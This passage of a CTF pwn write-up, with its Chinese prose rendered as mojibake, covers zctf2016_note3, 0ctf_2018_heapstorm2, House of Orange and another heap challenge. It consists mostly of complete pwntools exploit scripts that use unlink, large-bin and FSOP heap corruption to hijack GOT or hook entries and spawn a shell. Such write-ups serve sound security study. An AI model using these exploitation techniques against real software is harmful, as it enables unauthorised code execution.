class="string">&#x27;note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&#x27;]&#x27;</span>,<span class="built_in">str</span>(choice))</span><br><span class="line">    sl(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;name:&#x27;</span>,<span class="string">&#x27;merc&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;address:&#x27;</span>,<span class="string">&#x27;privacy&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x602120</span></span><br><span class="line">fd = ptr<span class="number">-0x18</span></span><br><span class="line">bk = ptr<span class="number">-0x10</span></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>,<span class="number">0x61</span>,fd,bk,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x80</span>,payload) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0</span>) <span class="comment"># 1,0x20</span></span><br><span class="line">add(<span class="number">0x80</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># padding,prev_size=0x20+0x80,PREV_IN_USE=0</span></span><br><span class="line">add(<span class="number">0</span>,flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>,<span class="number">0xa0</span>,<span class="number">0x90</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>,elf.got[<span class="string">&#x27;atoi&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&#x27;is &#x27;</span>)</span><br><span class="line">atoi = uu64(r(<span class="number">6</span>))</span><br><span class="line">system,binsh = ret2libc(atoi,<span class="string">&#x27;atoi&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">1</span>,p64(system))</span><br><span class="line">sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h2 id="zctf2016-note3"><a href="#zctf2016-note3" class="headerlink" title="zctf2016_note3"></a>zctf2016_note3</h2><p>è¿™é¢˜å’Œä¸Šé¢˜ç±»ä¼¼ï¼Œä¸è¿‡bssç»“æ„å¤§è‡´å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">current_ptr</span><br><span class="line">note0_ptr</span><br><span class="line">note1_ptr</span><br><span class="line">note2_ptr</span><br><span class="line">note3_ptr</span><br><span class="line">note4_ptr</span><br><span class="line">note5_ptr</span><br><span class="line">note6_ptr</span><br><span class="line">note7_ptr</span><br><span class="line">note0_size</span><br><span class="line">note1_size</span><br><span class="line">note2_size</span><br><span class="line">note3_size</span><br><span class="line">note4_size</span><br><span class="line">note5_size</span><br><span class="line">note6_size</span><br><span class="line">note7_size</span><br></pre></td></tr></table></figure>

<p>æœ¬é¢˜æ¼æ´åœ¨äº<code>edit</code>æ—¶ä¼šåˆ¤æ–­è¾“å…¥çš„é•¿åº¦æ˜¯å¦å°äº0ï¼Œå¦‚æœæ˜¯å°±å–ç›¸åæ•°ã€‚ä½†æ˜¯å¯ä»¥é€šè¿‡æ•´æ•°æº¢å‡ºï¼Œè¾“å…¥<code>0x8000000000000000</code>ï¼Œå®ƒçš„ç›¸åæ•°æ°å¥½æ˜¯å®ƒè‡ªèº«ï¼Œå¹¶ä¸”ä¾ç„¶æ˜¯ä¸€ä¸ªè´Ÿæ•°ï¼ˆ-1ï¼‰ã€‚è¿™æ ·å°±é€ æˆæ•°ç»„è¶Šç•Œï¼Œå¯ä»¥è¦†ç›–åˆ°<code>current_ptr</code>ã€‚</p>
<p>æˆ‘ä»¬çš„æ€è·¯æ˜¯å…ˆè®©<code>current_ptr</code>æŒ‡å‘<code>note3</code>ï¼Œç„¶ååˆ©ç”¨è¶Šç•Œè¦†ç›–ä¸€ä¸ª<code>fake_chunk</code>åˆ°<code>note3</code>ä¸Šï¼Œå†é‡Šæ”¾<code>note4</code>è§¦å‘unlinkï¼Œæ­¤æ—¶<code>note3_ptr</code>æŒ‡å‘<code>note0_ptr</code>ï¼Œè¿™æ ·å°±å¯ä»¥å®ç°GOTåŠ«æŒã€‚</p>
<p>ä½†æ˜¯æœ¬é¢˜çš„<code>show</code>åŠŸèƒ½è¢«ç¦ç”¨ï¼Œè€Œæˆ‘ä»¬è¿˜éœ€è¦æ³„éœ²libcåœ°å€ã€‚è¿™é‡Œç”¨çš„æ–¹æ³•æ˜¯åœ¨bssæ®µç©ºä½™å¤„å†™å…¥<code>%llx.</code>ï¼Œç„¶åæŠŠ<code>free</code>å…ˆåŠ«æŒåˆ°<code>printf</code>ï¼Œå»æ‰“å°è¿™ä¸€æ®µæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œç›¸å½“äºæ‰‹åŠ¨é€ äº†ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚è¿™æ ·å°±å¯ä»¥æ³„éœ²æ ˆä¸Šå†…å®¹ï¼Œä»è€Œæ³„éœ²ä½äºæ ˆä¸Šçš„<code>__libc_start_main_ret</code>åœ°å€ï¼ˆä¸€èˆ¬ä½äºåç§»é‡11å¤„ï¼‰ã€‚æœ€åæ³„éœ²libcå¾—åˆ°<code>system</code>åœ°å€ï¼Œè¦†ç›–<code>atoi</code>å³å¯ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params"><span class="built_in">len</span>,content=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;1024)&#x27;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">    sla(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">negative = <span class="number">0x8000000000000000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	add(<span class="number">0x200</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">fd = <span class="number">0x6020c8</span>+<span class="number">0x8</span>*<span class="number">3</span><span class="number">-0x18</span></span><br><span class="line">bk = <span class="number">0x6020c8</span>+<span class="number">0x8</span>*<span class="number">3</span><span class="number">-0x10</span></span><br><span class="line">fake_chunk = flat(<span class="number">0</span>,<span class="number">0x201</span>,fd,bk).ljust(<span class="number">0x200</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">fake_chunk += flat(<span class="number">0x200</span>,<span class="number">0x210</span>)</span><br><span class="line">edit(-negative,fake_chunk)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">edit(<span class="number">0</span>,p64(elf.plt[<span class="string">&#x27;printf&#x27;</span>])*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">bss_blank = <span class="number">0x602100</span></span><br><span class="line">edit(<span class="number">3</span>,p64(bss_blank))</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;%llx.&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">lsmr = <span class="built_in">int</span>(ru(<span class="string">&#x27;success&#x27;</span>).split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">10</span>],<span class="number">16</span>)</span><br><span class="line">system,binsh = ret2libc(lsmr,<span class="string">&#x27;__libc_start_main_ret&#x27;</span>)</span><br><span class="line">edit(<span class="number">3</span>,p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt;&gt;&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h2 id="0ctf-2018-heapstorm2"><a href="#0ctf-2018-heapstorm2" class="headerlink" title="0ctf_2018_heapstorm2"></a>0ctf_2018_heapstorm2</h2><p>åˆ†æå…ˆå’•äº†ï¼Œç­‰å®Œå…¨ç†è§£äº†å†è¡¥å……ã€‚å…ˆæ”¾ä¸€äº›å‚è€ƒçš„wpï¼š</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://eternalsakura13.com/2018/04/03/heapstorm2/">wp1</a></li>
<li><a target="_blank" rel="noopener" href="https://veritas501.space/2018/04/11/Largebin%20%E5%AD%A6%E4%B9%A0/">wp2</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/willinin/0ctf2018/blob/master/heapstorm2/heapstorm2.md">wp3</a></li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    ru(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">    sl(<span class="string">&#x27;%d&#x27;</span> % size)</span><br><span class="line">    ru(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    sl(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    sla(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    sa(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line">    ru(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    sl(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    ru(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    sl(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    m = ru(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">    pos1 = m.find(<span class="string">&#x27;]: &#x27;</span>) + <span class="built_in">len</span>(<span class="string">&#x27;]: &#x27;</span>)</span><br><span class="line">    pos2 = m.find(<span class="string">&#x27;\n1. &#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> m[pos1:pos2]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment"># 2</span></span><br><span class="line">edit(<span class="number">1</span>,flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x4f0</span>,<span class="number">0x500</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment"># 5</span></span><br><span class="line">edit(<span class="number">4</span>,flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x4f0</span>,<span class="number">0x500</span>))</span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment"># 6</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span><span class="number">-12</span>))</span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x4d8</span>) <span class="comment"># 7</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x38</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x4e8</span>) <span class="comment"># 2</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span><span class="number">-12</span>))</span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x4d8</span>) <span class="comment"># 8</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x4e8</span>) <span class="comment"># 2</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">storage = <span class="number">0x13370800</span></span><br><span class="line">fake = storage<span class="number">-0x20</span></span><br><span class="line"></span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x4f1</span>,<span class="number">0</span>,fake)</span><br><span class="line">edit(<span class="number">7</span>,payload)</span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x4e1</span>,<span class="number">0</span>,fake+<span class="number">8</span>,<span class="number">0</span>,fake<span class="number">-0x18</span><span class="number">-5</span>)</span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	add(<span class="number">0x48</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">	print(<span class="string">&#x27;Try again?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x13377331</span>,storage)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x13377331</span>,storage,<span class="number">0x1000</span>)</span><br><span class="line">p1 = payload + flat(storage<span class="number">-0x20</span>+<span class="number">3</span>,<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">0</span>,p1)</span><br><span class="line"></span><br><span class="line">heap = uu64(show(<span class="number">1</span>))</span><br><span class="line">p2 = payload + flat(heap+<span class="number">0x10</span>,<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">0</span>,p2)</span><br><span class="line"></span><br><span class="line">base = uu64(show(<span class="number">1</span>))<span class="number">-88</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]<span class="number">-0x10</span></span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">free_hook = base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p3 = payload + flat(free_hook,<span class="number">0x100</span>,storage+<span class="number">0x50</span>,<span class="number">0x100</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">0</span>,p3)</span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line"></span><br><span class="line">sl(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br></pre></td></tr></table></figure>


<h2 id="houseoforange-hitcon-2016"><a href="#houseoforange-hitcon-2016" class="headerlink" title="houseoforange_hitcon_2016"></a>houseoforange_hitcon_2016</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE*)0x555b7d04b4f0</span><br><span class="line">$2 &#x3D; &#123;</span><br><span class="line">  _flags &#x3D; 1852400175,</span><br><span class="line">  _IO_read_ptr &#x3D; 0x61 &lt;error: Cannot access memory at address 0x61&gt;,</span><br><span class="line">  _IO_read_end &#x3D; 0x0,</span><br><span class="line">  _IO_read_base &#x3D; 0x7f29a0f30510 &quot;&quot;,</span><br><span class="line">  _IO_write_base &#x3D; 0x2 &lt;error: Cannot access memory at address 0x2&gt;,</span><br><span class="line">  _IO_write_ptr &#x3D; 0x3 &lt;error: Cannot access memory at address 0x3&gt;,</span><br><span class="line">  _IO_write_end &#x3D; 0x0,</span><br><span class="line">  _IO_buf_base &#x3D; 0x0,</span><br><span class="line">  _IO_buf_end &#x3D; 0x0,</span><br><span class="line">  _IO_save_base &#x3D; 0x0,</span><br><span class="line">  _IO_backup_base &#x3D; 0x0,</span><br><span class="line">  _IO_save_end &#x3D; 0x0,</span><br><span class="line">  _markers &#x3D; 0x0,</span><br><span class="line">  _chain &#x3D; 0x0,</span><br><span class="line">  _fileno &#x3D; 0,</span><br><span class="line">  _flags2 &#x3D; 0,</span><br><span class="line">  _old_offset &#x3D; 0,</span><br><span class="line">  _cur_column &#x3D; 0,</span><br><span class="line">  _vtable_offset &#x3D; 0 &#39;\000&#39;,</span><br><span class="line">  _shortbuf &#x3D; &quot;&quot;,</span><br><span class="line">  _lock &#x3D; 0x0,</span><br><span class="line">  _offset &#x3D; 0,</span><br><span class="line">  _codecvt &#x3D; 0x0,</span><br><span class="line">  _wide_data &#x3D; 0x0,</span><br><span class="line">  _freeres_list &#x3D; 0x0,</span><br><span class="line">  _freeres_buf &#x3D; 0x0,</span><br><span class="line">  __pad5 &#x3D; 0,</span><br><span class="line">  _mode &#x3D; 0,</span><br><span class="line">  _unused2 &#x3D; &#39;\000&#39; &lt;repeats 19 times&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    sla(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">    sla(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">size,name</span>):</span></span><br><span class="line">    sla(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;:&#x27;</span>,name)</span><br><span class="line">    sla(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">useless = flat(<span class="number">0</span>,<span class="number">0x21</span>,<span class="number">0x1f00000001</span>,<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span> + useless + flat(<span class="number">0</span>,<span class="number">0xfa1</span>)</span><br><span class="line">edit(<span class="number">0x40</span>,payload) <span class="comment"># corrupt top chunk</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x1000</span>) <span class="comment"># old_top -&gt; unsorted</span></span><br><span class="line">add(<span class="number">0x400</span>) <span class="comment"># slice old top</span></span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">base = uu64(ru(<span class="string">&#x27;\n&#x27;</span>))<span class="number">-1640</span>-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]<span class="number">-0x10</span></span><br><span class="line">leak(<span class="string">&#x27;base&#x27;</span>,base)</span><br><span class="line">system = base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">io_list_all = base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;large chunk:</span></span><br><span class="line"><span class="string">0x56512e53b0c0:	0x0000000000000000 0x0000000000000411</span></span><br><span class="line"><span class="string">0x56512e53b0d0:	0x6161616161616161	0x00007f01ea979188</span></span><br><span class="line"><span class="string">0x56512e53b0e0:	0x000056512e53b0c0	0x000056512e53b0c0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">edit(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">show()</span><br><span class="line">ru(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">heap = uu64(ru(<span class="string">&#x27;\n&#x27;</span>)) - <span class="number">0xc0</span></span><br><span class="line">leak(<span class="string">&#x27;heap&#x27;</span>,heap)</span><br><span class="line"></span><br><span class="line"><span class="comment"># jump_table+0x18</span></span><br><span class="line">payload = flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,system).ljust(<span class="number">0x400</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment"># _flags,size,fd,bk,write_base,write_ptr,padding,fake_vtable</span></span><br><span class="line">payload += useless + flat(<span class="string">&#x27;/bin/sh\x00&#x27;</span>,<span class="number">0x61</span>,<span class="number">0</span>,io_list_all<span class="number">-0x10</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0xd8</span><span class="number">-0x30</span>),heap+<span class="number">0xd0</span>)</span><br><span class="line">edit(<span class="number">0x1000</span>,payload)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;choice :&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br></pre></td></tr></table></figure>


